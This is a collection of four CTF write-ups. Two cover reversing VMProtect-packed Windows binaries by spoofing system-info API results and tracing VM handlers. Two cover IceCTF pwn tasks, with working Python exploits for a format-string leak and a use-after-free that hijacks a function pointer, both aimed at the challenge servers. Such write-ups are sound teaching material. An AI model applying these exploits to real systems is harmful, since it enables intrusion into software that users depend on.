<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-1amtom
description: CTF writeups and security challenges by 1amtom.
---

# Writeups by 1amtom

Source repository: `/repos/1amtom`

## Repository Index

- writeups/2016-08-16-IceCTF/pwn-60-dear-diary/README.md
- writeups/2016-08-16-IceCTF/pwn-75-drumpf-hotels/README.md
- writeups/2016-02-06-SharifCTF/re-200-HI/README.md
- writeups/2016-02-06-SharifCTF/re-400-maze/README.md

## Writeup Content


### File: writeups/2016-02-06-SharifCTF/re-200-HI/README.md

# HI (Reverse, 200)

In the task description we are given the following info:

>The Program is registerd for following system specification:  
>Processor type: Intel Itanium-based  
>Number of processors: 64  
>Physical RAM => 128GB  
>OS version: 12.2 Build 1200  

A little bit info about task file:
>File name: HI2.exe  
>File type: Win32 PE Executable  
>SHA1: 8dd906f847bc21078eeb95af69944a4d966eefec

Quick look at the file in CFF Explorer reveals the following:
>_8_ sections, _2_ of which are **.vmp0** and **.vmp1**  
>TLS directory  
>Export directory  

Just to make sure that we are dealing with VMProtect, let's just take a peek at image's entry point:
```
004F22CE                /E9 54370000           jmp HI2.004F5A27
004F22D3               ^|E9 22B5FFFF           jmp HI2.004ED7FA
004F22D8                |B3 8B                 mov bl,8B
...
004F5A27                 50                    push eax
004F5A28                 60                    pushad
004F5A29                 C74424 20 0BAAB1FF    mov dword ptr ss:[esp+20],FFB1AA0B
004F5A31                 66:C70424 59BA        mov word ptr ss:[esp],0BA59
004F5A37                 C74424 1C 8BC4B62B    mov dword ptr ss:[esp+1C],2BB6C48B
004F5A3F                 885424 04             mov byte ptr ss:[esp+4],dl
004F5A43                 8D6424 1C             lea esp,dword ptr ss:[esp+1C]
004F5A47                 E9 B2110D00           jmp HI2.005C6BFE
```

Now we're 100% sure it's indeed VMProtect.
Ok, but what does it mean?
In general cases VMProtect is used to change (_virtualize_) the code to such form that the original form is lost and unrecoverable. In this case though, it means that authors doesn't want us to play with the application code itself, but they want us to focus on values returned by some system functions.

Debugger settings (ollydbg v1.10)
> Options/Debugging options/Events/System breakpoint  
> StrongOD plugin, check the option "Remove EP one-shot"

Before we take a look into file itself, let's run just run it and see what it says:
![hi-00.png](hi-00.png)

That should be enough, let's take a look at the MSDN, and find function(s) that could provide us at least part of the information we need.

The first one we need is `GetSystemInfo()`
``` c++
void WINAPI GetSystemInfo(
  _Out_ LPSYSTEM_INFO lpSystemInfo
);
```

Function returns `SYSTEM_INFO`structure, of which 2 fields are interesting for us.
``` c++
typedef struct _SYSTEM_INFO {
  union {
    DWORD  dwOemId;
    struct {
      WORD wProcessorArchitecture; // *interesting for us*
      WORD wReserved;
    };
  };
  DWORD     dwPageSize;
  LPVOID    lpMinimumApplicationAddress;
  LPVOID    lpMaximumApplicationAddress;
  DWORD_PTR dwActiveProcessorMask;
  DWORD     dwNumberOfProcessors; // *interesting for us*
  DWORD     dwProcessorType;
  DWORD     dwAllocationGranularity;
  WORD      wProcessorLevel;
  WORD      wProcessorRevision;
} SYSTEM_INFO;
```

We need to change these fields accordingly:  
`wProcessorArchitecture` needs to be equal to `PROCESSOR_ARCHITECTURE_IA64`which is `0x0006`  
`dwNumberOfProcessors`needs to be equal to `0x40`

Next function that seems to be interesing for us is `GlobalMemoryStatusEx()`
``` c++
BOOL WINAPI GlobalMemoryStatusEx(
  _Inout_ LPMEMORYSTATUSEX lpBuffer
);
```
Function returns `MEMORYSTATUSEX`structure, of which one field is interesting for us.
``` c++
typedef struct _MEMORYSTATUSEX {
  DWORD     dwLength;
  DWORD     dwMemoryLoad;
  DWORDLONG ullTotalPhys; // *interesting for us*
  DWORDLONG ullAvailPhys;
  DWORDLONG ullTotalPageFile;
  DWORDLONG ullAvailPageFile;
  DWORDLONG ullTotalVirtual;
  DWORDLONG ullAvailVirtual;
  DWORDLONG ullAvailExtendedVirtual;
} MEMORYSTATUSEX, *LPMEMORYSTATUSEX;
```
To satisfy task requirements let's change  `ullTotalPhys` to `0x0000001FFFFFFFFF` .

The last function which output we're going to change is `GetVersion()`
``` c++
DWORD WINAPI GetVersion(void);
```
Return value has the following form `XXXXYYZZ`:
```
XXXX - build
  YY - minor version
  ZZ - major version
```
The expected value thus is:`0x04B0020C`.

And that's it, when everyting was done right, we are given the flag:

![hi-01.png](hi-01.png)

Flag: ef71d59e50c5fc4cd7604db77da16de8  
  
Ps. How to set breakpoints and override the returned values is left to readers as homework.


### File: writeups/2016-02-06-SharifCTF/re-400-maze/README.md

# Maze3 (Reverse, 400)

In the task description we are given the following info:
>Play the game and capture the flag!

A little bit info about task file:
>File name: Maze3.exe  
>File type: Win32 PE Executable  
>SHA1: a7546206830d0c6ca136598615a25a8232903d7b

Tools used:  
>Ollydbg 2 with ScyllaHide plugin

Task is again packed with VMProtect, but this time we're going to dig a big deeper.  
To start with, make sure your debugger is set to `Break on Tls`.

>**Note:**  
>Tls callbacks are executed before VMProtect's Entry Point, that's why we want to start there.

Now we're going to find a one of VMProtect's handlers called `vm-exit`.  
In order to do so, we need to perform a `run trace into` (which will log all executed instructions to file if set up correctly).

Let's now find the first `ret` instruction that is different from the most common ones.   
```
findstr /c:"ret" runtrace.log
```

The output should yield something like:
```
...
main    Maze3.0088A431  retn 3C ESP=0012F90C
main    Maze3.0088A431  retn 3C ESP=0012F90C
main    Maze3.0088A431  retn 3C ESP=0012F90C
main    Maze3.0088A84E  retn 18 ESP=0012FA10 // *interesting for us*
main    ntdll.77F1896E  retn 10 ESP=0012FA34
main    ntdll.77EDF58A  retn 8  ESP=0012FA70
...
```

Having `runtrace.log` opened in our favourite editor, let's now find the beginning of `vm-exit` handler.  
As we've found the right address (in this case `0088A84E`), we need to go up until we reach the beginning of the handler (which is the first instruction after the most common `ret`) which in this case is `0088A1CB`.

Just to clarify the `vm-exit` handler starts at `0088A1CB` and ends at `0088A84E`.

It should look like this:
```
0088A1CB       60                 pushad                                       
0088A1CC       D4 F1              aam 0F1
0088A1CE       FF3424             push dword ptr ss:[esp]
0088A1D1       C60424 9C          mov byte ptr ss:[esp],9C
0088A1D5       89EC               mov esp,ebp
0088A1D7       D2CC               ror ah,cl
0088A1D9       2F                 das
0088A1DA       58                 pop eax
```

Let's copy some of its bytes as we're going to need them later.
```
60 D4 F1 FF 34 24 C6 04 24 9C 89 EC D2 CC 2F 58
```

Change your debugger settings to make a pause at `System breakpoint`.

>**Note:**  
>At this point it doesn't really matter if it's `System breakpoint` or `Entry point of main module`  
>as we are going to run the application eventually.  
>But experience always says: _the sooner (earlier in this case) the better_

Run the application, and in memory view let's search (globally) for `vm-exit` binary pattern we saved earlier.
If we've done everything right, we should have a match on already unpacked code at address `004015AA`.

Now let's move on to `004015AA`, follow the code till `retn 18` and set there hardware logging breakpoint on execution (it should log the destination address of `retn 18`. The expression could simply be `dword ptr [esp+18]`).

Restart the application and run it again.

>**Note:**  
>At this point log window should contain every address that the `vm-exit` handler has reached.

Let's go briefly through the addresses in logs:
```
...
77E2EA51   GetSystemTime                8BFF               mov edi, edi
008B81C0   malloc                       8BFF               mov edi, edi
100334C0   ?sputn@?$basic_streambuf     55                 push ebp
00401967   (!!)                         C745 FC 01000000   mov dword ptr ss:[ebp-4], 1
...
```

The code that is pretty interesing for us is under `00401967`.  
Let's put there hardware breakpoint on execution, remove all other breakpoints, restart the application and run it again.

>**Note:**  
>At this point the application's console window has written `Longest Path has `

As we hit a breakpoint on `00401967`, let's dump a bit of stack.

```
0012FE30   586E4F02
0012FE34   002DE0F4  ucrtbase.002DE0F4
0012FE38   00085DE0
0012FE3C   7FFDF000
0012FE40   10063DB8  offset msvcp140.?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A
0012FE44   00000001
0012FE48   00000206
0012FE4C   004031DC  ASCII "Longest Path has "
0012FE50   00000216
0012FE54   00000000
0012FE58   00000011
0012FE5C   10063DB8  offset msvcp140.?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A
0012FE60   0012FE30  ASCII 02,"On"
0012FE64   0012FF78  Pointer to next SEH record
0012FE68   0040284E  SE handler
0012FE6C   00000002
0012FE70   0012FF3C
0012FE74   0052A1D1  Maze3.0052A1D1
0012FE78   0042EF00  Maze3.0042EF00
0012FE7C   00085DE0
0012FE80   002DE0F4  ucrtbase.002DE0F4
0012FE84   002DE76C  ucrtbase.002DE76C
0012FE88   7FFDF000
0012FE8C   7FA58755
0012FE90   00000000
0012FE94   00000246
0012FE98   002DE76C  ucrtbase.002DE76C
0012FE9C   11798B86
0012FEA0   002C133F  RETURN to ucrtbase.002C133F from ucrtbase.00232CBB
0012FEA4   00000000
0012FEA8   005F2206  Maze3.005F2206
0012FEAC   00000206
0012FEB0   00000286
0012FEB4   F394D17E
0012FEB8   01A60020
0012FEBC   00000246
0012FEC0   00000246
0012FEC4   00407074  RETURN to Maze3.00407074 from Maze3.00406DC0
0012FEC8   00402300  Maze3.00402300
0012FECC   00085DE0
0012FED0   00432C65  Maze3.00432C65
0012FED4   00000213
0012FED8   00A96210
0012FEDC   0202F000
```

Having it saved, allow an app to continue so it's not stuck on breakpoint anymore.

>**Note:**  
>At this point the application's console window has written `Longest Path has 548320 nodes!`

Let's convert `548320` to hex (`0x85DE0`) and check for it against the stack we previously saved.  
We should have 3 matches:
```
0012FE38   00085DE0
...
0012FE7C   00085DE0
...
0012FECC   00085DE0
```

You may now guess what would happen if we changed these values to let say `0`.  
I'll left it for your as practice.

Anyway, we got the flag:  
![maze-00.png](maze-00.png)

Flag: Just_Hook_Get_System_Time_API_WooW



### File: writeups/2016-08-16-IceCTF/pwn-60-dear-diary/README.md

# Dear Diary (Pwn, 60)

In the task description we are given the following info:
>We all want to keep our secrets secure and what is more important than our precious diary entries? We made this highly secure diary service that is sure to keep all your boy crushes and edgy poems safe from your parents.

A little bit info about task file:
```
File name : dear_diary  
File type : ELF 32-bit LSB executable  
SHA1      : 34cff95cf188187fe9f2d92d95b97bac128aa459
```

And some `checksec` details:
```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

Tools used:  
>IDA Pro  

Let's go straight to the `main()` and see what's there for us:
```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int choice;
  unsigned int entry_id;
  char buffer[5120];
  char choice_data[4];

  ...
  flag(); // interesting
  entry_id = 0;
  puts("-- Diary 3000 --");
  fflush(stdout);
  while ( 1 )
  {
    while ( 1 )
    {
      print_menu();
      fgets(choice_data, 4, stdin);
      choice = atoi(choice_data);
      if ( choice != 2 )
        break;
      if ( entry_id )
        print_entry(&buffer[256 * (entry_id - 1)]); // interesting
      else
        puts("No entry found!");
    }
    if ( choice == 3 )
      break;
    if ( choice == 1 )
    {
      if ( entry_id > 0x13 )
      {
        puts("diary ran out of space..");
        exit(1);
      }
      add_entry(&buffer[256 * entry_id++]); // interesting
    }
    else
    {
      puts("Invalid input.");
    }
  }
  exit(0);
}
```

We can see here that `flag()` function is called right at the start.
Then a menu is printed and some action taken according to the choice.  
Let's dig deeper and see what each of those marked functions do.

```c
int flag()
{
  ...
  fd = open("./flag.txt", 0);
  read(fd, &data, 0x100u);
  ...
}
```

Ok, nothing really special here, as it only opens the `./flag.txt` file and reads its content to a buffer at `.bss:0804A0A0 data`  

```c
int __cdecl add_entry(char *a1)
{
  ...
  printf("Tell me all your secrets: ");
  fflush(stdout);
  fgets(a1, 256, stdin);
  if ( strchr(a1, 'n') )
  {
    puts("rude!");
    exit(1);
  }
  ...
}
```

Here it only reads up to 256 bytes from _stdin_ into the buffer passed in argument, and checks if there's an `n` character in the string. First suspicious thing, but let's go further.

```c
int __cdecl print_entry(const char *a1)
{
  ...
  printf(a1);
  fflush(stdout);
  ...
}
```

And there we have it, parameter is directly passed into `printf()` function.  
Nice and clean `format string vulnerability`.

Ok, now it's the time for a short recap.
> There's a buffor allocated on stack that can hold up to 20 entries.  
> Each diary entry is 256 bytes long.  
> Diary entry can't have `n` character in it.  
> We can print out recently added diary entry.  

`strchr(a1, 'n')` in `add_entry()` is there presumably for checking against one of `printf's` writing modifiers `%n`, `%hn`, `%hhn`. Thus we can't use any of them.

Let's run the app and put a custom string with some marker at the beginning, that would print out the stack for us.

```
-- Diary 3000 --

1. add entry
2. print latest entry
3. quit
> 1
Tell me all your secrets: AAAA%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x

1. add entry
2. print latest entry
3. quit
> 2
AAAAb763a64d|b77b1000|bf840088|bf841488|0|a|c2951300|0|0|bf841498|804888c|bf840088|4|b77b1c20|0|0|1|41414141|257c7825|78257c78|7c78257c|257c7825|78257c78
```

Great, `0x41414141` which corresponds to `AAAA` is at `18th` place.
What we need is some way of reading the _flag_ that is stored under buffer `.bss:0804A0A0`.

So, instead of `0x41414141` let's put `0x0804A0A0` and instead of `%x` at `18th` let's put `%s`.

```python
import struct
import socket

data = ''
data += struct.pack( '<I', 0x0804a0a0 )
data += '%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%s'

s = socket.create_connection( ( 'diary.vuln.icec.tf', 6501 ) )
print s.recv( 256 )
print s.recv( 256 )
s.send( '1\n' )
print s.recv( 256 )
s.send( data + '\n' )
print s.recv( 256 )
s.send( '2\n' )
print repr( s.recv( 256 ) )
```

And that's all, we get the flag `IceCTF{this_thing_is_just_sitting_here}`



### File: writeups/2016-08-16-IceCTF/pwn-75-drumpf-hotels/README.md

# Drumpf Hotels (Pwn, 75)

In the task description we are given the following info:
>Drumpf Hotels - Making security great again!  
>Donald Drumpf decided to move his hotel operations online. Since he isn't very fond of foreigners coding for him, he dediced to code the platform with his own tiny hands.

A little bit info about task file:
```
File name : drumpf  
File type : ELF 32-bit LSB executable  
SHA1      : e06887d95dce0a05f0c9c932b1c0eba70f2516cd
```

And some `checksec` details:
```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

Tools used:  
>IDA Pro  

Let's go straight to the `main()` and see what's there for us:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char choice[4];
  int security_cookie;

  ...
  print_logo();
  while ( 1 )
  {
    print_menu();
    fgets(choice, 4, stdin);
    switch ( atoi(choice) )
    {
      case 1:
        book_suite(); // interesting
        break;
      case 2:
        book_room(); // interesting
        break;
      case 3:
        delete_booking(); // interesting
        break;
      case 4:
        print_booking(); // interesting
        break;
      case 5:
        puts("Make overflows great again!");
        fflush(stdout);
        return 0;
      default:
        puts("Invalid choice!");
        fflush(stdout);
        break;
    }
  }
}
```

Ok, everything here seems to be self-explanatory.  
We can either `book_suite()`, `book_room()`, `delete_booking()` or `print_booking()`.  
There is also `flag()` function that doesn't have any reference in the binary.

```c
int flag()
{
  ...
  char buf[256];
  ...
  fd = open("./flag.txt", 0);
  read(fd, buf, 0x100u);
  printf("%s", buf);
  fflush(stdout);
  ...
}
```
Oh, it just reads the flag and prints it to the _stdout_.  
If it's here, there's definitely some purpose for that.

But, let's go back to those marked functions and see what they do.
```c
struct suite_struct {
	void * fnPrintName;
	uint8_t name[256];
	uint32_t number;
};

int book_suite()
{
  suite_struct *suite_info;
  char suite_no[16];

  ...
  suite = malloc(sizeof(suite_struct));
  printf("Name: ");
  fflush(stdout);
  fgets(suite->name, 256, stdin);
  suite->fnPrintName = print_name; // important!
  printf("Suite number: ");
  fflush(stdout);
  fgets(suite_no, 16, stdin);
  suite_info = suite;
  suite_info->number = atoi(suite_no);
  puts("Booked a suite!");
  fflush(stdout);
  ...
}
```

Just for convenience, I added a custom structure to IDA so I could clearly see what's going on here.

Summary:
> `suite_struct` is allocated on heap using `malloc()` and filled in  
> Suite name `fgets(suite->name, 256, stdin);`  
> Function that will print out the name `suite->fnPrintName = print_name;`  
> Suite number `suite_info->number = atoi(suite_no);`  

Let's take a look at `print_name()` function.

```c
int __cdecl print_name(int a1)
{
  ...
  printf("Name: %s", a1);
  fflush(stdout);
  ...
}
```

Ok, so it just prints out as a string whatever is passed in the first argument.

Let's go further.
```c
struct room_struct {
	uint32_t number;
	uint8_t name[256];
};

int book_room()
{
  room_struct *room_info;
  char room_no[16];

  ...
  room = malloc(sizeof(room_struct));
  printf("Name: ");
  fflush(stdout);
  fgets(room->name, 256, stdin);
  printf("Room number: ");
  fflush(stdout);
  fgets(room_no, 16, stdin);
  room_info = room;
  room_info->number = atoi(room_no);
  puts("Booked a room!");
  fflush(stdout);
  ...
}
```

Again, for convenience, I added another structure.

Summary:
> `room_struct` is allocated on heap using `malloc()` and filled in  
> Room name `fgets(room->name, 256, stdin);`  
> Room number `room_info->number = atoi(room_no);`  

Moving on...
```c
int delete_booking()
{
  ...
  if ( suite || room )
  {
    if ( suite )
    {
      free(suite);
      puts("Suite booking deleted!");
      fflush(stdout);
    }
    if ( room )
    {
      free(room);
      puts("Room booking deleted!");
      fflush(stdout);
    }
  }
  else
  {
    printf("No booking found!");
    fflush(stdout);
  }
  ...
}
```

Here we can see that `suite` and/or `room` structure are/is freed.  
What's worth noting is fact that after freeing, there's no `NULL` assignment to a freed buffer.  
We will use that fact later.

And the last function to look at:
```c
int print_booking()
{
  ...
  if ( suite || room )
  {
    if ( suite )
    {
      (suite->fnPrintName)(suite->name);
      printf("Rooms number: %u\n", suite->number);
      fflush(stdout);
    }
    if ( room )
    {
      printf("Name: %s", room->name);
      printf("Rooms number: %u\n", room->number);
      fflush(stdout);
    }
  }
  else
  {
    printf("No booking found!");
    fflush(stdout);
  }
  ...
}
```

As it says, it prints `suite` and/or `room`.  
Although in case of `suite` it uses a structure member `fnPrintName` called with one argument.

What we can see here is typical example of `Use After Free vulnerability`.  

Here's short example in python:
```python
>>> import ctypes
>>> libc = ctypes.cdll.LoadLibrary('libc.so.6')
>>> libc.malloc(264)
157601144
>>> libc.malloc(264)
157462264
>>> libc.malloc(264)
157598936
>>> libc.malloc(264)
157599208
>>> libc.free(_)
1
>>> libc.malloc(260)
157599208
>>>
```

And a brief explanation:
>Buffer at address `157599208` of size `264` is created.  
>Buffer at address `157599208` is freed.  
>Buffer at address `157599208` of size `260` is allocated again.

But, how can we use that? Remember the structure layout for `suite_struct` and `room_struct`?  
If not let's bring them back.

```c
struct suite_struct {
	void * fnPrintName;
	uint8_t name[256];
	uint32_t number;
};

struct room_struct {
	uint32_t number;
	uint8_t name[256];
};
```

What is a room number in case of `room_struct`, can be used as `fnPrintName` in case of `suite_struct`.  
This way we could get execution of arbitrary function.

How does that help us?  
Remember `flag()` function that didn't have any reference?  
What if we pass its address `0x0804863D` as a room number (in decimal, because of `atoi()`), and then reuse that object as a suite (using `print_booking()`)?
We would have execution of `0x0804863D`.

Perfect, let's do it!

```python
import struct
import socket

s = socket.create_connection( ( 'drumpf.vuln.icec.tf', 6502 ) )
print s.recv(4096)
print s.recv(4096)

for i in xrange( 4 ):
	s.send('1\n') # add suite
	print s.recv(4096)
	s.send('foo\n') # suite name
	print s.recv(4096)
	s.send('1\n') # suite number
	print s.recv(4096)
	print s.recv(4096)

s.send('3\n') # delete booking
print s.recv(4096)

s.send('2\n') # add room
print s.recv(4096)

s.send('foo\n') # room name
print s.recv(4096)
s.send('134514237\n') # room number 0x804863D
print s.recv(4096)
print s.recv(4096)

print s.send('4\n') # print booking
print repr( s.recv(4096) )
print repr( s.recv(4096) )
```

And that's it, we get the flag `IceCTF{they_can_take_our_overflows_but_they_will_never_take_our_use_after_freeeedom!}`

